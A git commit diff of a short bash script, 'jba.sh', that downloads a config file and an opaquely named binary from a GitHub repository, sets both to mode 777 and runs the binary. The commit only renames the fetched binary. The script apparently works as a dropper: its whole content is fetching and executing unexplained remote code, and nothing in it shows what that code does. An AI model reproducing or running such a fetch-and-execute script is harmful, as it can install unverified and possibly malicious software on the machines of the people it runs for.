1257bb667e1aa5b7b4ecbe65cbdfe931f1fc69b3
vedhagsvp <vedhag230223@gmail.com>
2025-09-08 03:12:02 +0530

    Update jba.sh

--- jba.sh
+++ jba.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
 wget https://github.com/vedhagsvp/taberas/raw/main/appsettings.json
-wget https://github.com/vedhagsvp/taberas/releases/download/mlb/mnlaue
-chmod 777 mnlaue appsettings.json
-./mnlaue
+wget https://github.com/vedhagsvp/taberas/releases/download/mlb/jtkopls
+chmod 777 jtkopls appsettings.json
+./jtkopls
